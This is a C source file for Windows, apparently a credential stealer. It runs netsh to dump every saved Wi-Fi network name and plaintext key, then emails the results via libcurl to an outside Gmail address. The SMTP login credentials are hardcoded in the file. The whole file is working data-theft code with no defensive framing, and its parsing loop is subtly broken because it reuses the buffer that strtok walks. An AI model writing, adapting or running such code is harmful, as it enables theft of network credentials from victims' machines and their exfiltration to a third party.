#include <windows.h>
#include <wlanapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "libcurl.lib")

#define SMTP_SERVER "smtp.seznam.cz"
#define SMTP_PORT 587
#define SMTP_USER "info@infopeklo.cz"
#define SMTP_PASS "Polik"
#define SMTP_TO "alfikeita@gmail.com"
#define SMTP_SUBJECT "Wi-Fi passwords!"
#define SMTP_BODY "Here are the Wi-Fi passwords:\n"

// Function to run a shell command and capture its output
void runCommand(const char *command, char *output, size_t output_size) {
    FILE *fp = _popen(command, "r");
    if (fp == NULL) {
        perror("Failed to run command");
        return;
    }

    size_t i = 0;
    while (fgets(output + i, output_size - i, fp) != NULL) {
        i += strlen(output + i);
        if (i >= output_size - 1) {
            break;
        }
    }

    _pclose(fp);
}

// Function to send email via SMTP using libcurl
int sendSMTPEmail(const char *to, const char *subject, const char *body) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *recipients = NULL;
    char from[] = "info@infopeklo.cz";
    char auth_string[256];

    // Initialize CURL library
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "CURL initialization failed.\n");
        return 1;
    }

    // Set SMTP server, port, and authentication details
    curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.seznam.cz:587");
    curl_easy_setopt(curl, CURLOPT_USERNAME, SMTP_USER);
    curl_easy_setopt(curl, CURLOPT_PASSWORD, SMTP_PASS);
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);

    // Set recipient email
    recipients = curl_slist_append(recipients, to);
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    // Set the email subject and body
    char email_body[2048];
    snprintf(email_body, sizeof(email_body), "Subject: %s\r\n\r\n%s", subject, body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, email_body);

    // Perform the email sending
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Failed to send email: %s\n", curl_easy_strerror(res));
        return 1;
    }

    // Clean up
    curl_slist_free_all(recipients);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return 0;
}

// Function to extract Wi-Fi passwords from the system
void extractWiFiPasswords() {
    char command[256];
    char output[2048];

    // Run command to get the list of Wi-Fi profiles
    strcpy(command, "netsh wlan show profiles");
    runCommand(command, output, sizeof(output));

    printf("Extracting Wi-Fi passwords:\n");

    char *line = strtok(output, "\n");
    char wifiDetails[2048] = "Wi-Fi passwords:\n";
    while (line != NULL) {
        if (strstr(line, "All User Profile") != NULL) {
            // Extract the Wi-Fi network name (SSID)
            char ssid[128];
            sscanf(line, "    All User Profile     : %[^\n]", ssid);
            printf("Found Wi-Fi profile: %s\n", ssid);

            // Now, get the password for this network (if available)
            snprintf(command, sizeof(command), "netsh wlan show profile \"%s\" key=clear", ssid);
            runCommand(command, output, sizeof(output));

            // Search for the key material (Wi-Fi password)
            char *password = strstr(output, "Key Content");
            if (password != NULL) {
                password += 15;  // Skip the "Key Content" label
                char wifiPassword[128];
                sscanf(password, " %127[^\n]", wifiPassword);
                printf("Password: %s\n", wifiPassword);

                // Prepare the email body with Wi-Fi details
                snprintf(wifiDetails + strlen(wifiDetails), sizeof(wifiDetails) - strlen(wifiDetails), "SSID: %s\nPassword: %s\n", ssid, wifiPassword);
            } else {
                printf("No password set for this network.\n");
                snprintf(wifiDetails + strlen(wifiDetails), sizeof(wifiDetails) - strlen(wifiDetails), "SSID: %s\nPassword: Not Set\n", ssid);
            }
        }

        line = strtok(NULL, "\n");
    }

    // Send the extracted Wi-Fi information via email
    sendSMTPEmail(SMTP_TO, SMTP_SUBJECT, wifiDetails);
}

int main() {
    // Extract Wi-Fi profiles and passwords
    extractWiFiPasswords();
    return 0;
}
